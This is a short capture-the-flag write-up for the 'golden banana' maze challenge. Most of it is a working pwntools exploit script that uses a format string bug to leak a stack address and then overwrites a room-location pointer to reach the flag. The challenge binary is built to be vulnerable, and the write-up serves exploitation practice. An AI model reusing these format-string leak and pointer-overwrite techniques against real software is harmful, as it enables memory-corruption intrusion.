# golden banana

This challenge looks like a text based maze puzzle where you have to find the secret room to get the flag but there is no way of getting to it using regular game mechanics.

There is a format string vulnerability and a couple of logic bugs as the location of the next room and the secret room is stored on the stack. We can get a stack leak and overwrite a next location pointer with the location of the secret room to get the flag.

```python
from pwn import *
context.arch = "amd64"

# io = remote('chals.damctf.xyz', 30234)
io = process("./golden_banana")
if args.GDB:
	gdbscript="""
	c
	"""
	gdb.attach(io, gdbscript=gdbscript)

io.sendline(b'1')
io.sendline(b'1')

payload = b'A'*1024 # input_buf
for i in range(2):
	payload += b'B'*1024 # location.description

	for i in range(4):	# choices
		payload += b'A'*1024 # description
		payload += b'B'*8	 # *location
	payload += b'%lx-'*2 # num_choices
	payload += b'%lx-'*2  # end_location


io.sendline(payload)
io.sendline(b'2')
sleep(2)
io.clean()
io.sendline(b'2')

leak = io.recvline().split(b'-')
stack_addr = int(leak[2], 16)
secret_location = stack_addr + 0xddb8
log.info(f"stack leak is {hex(stack_addr)}")
log.info(f"secret location {hex(secret_location)}")

payload += b'A'*1008
payload += b'B'*1024 # choice description
payload += p64(secret_location) # location
io.sendline(payload)

io.sendline(b'1')

io.interactive()
```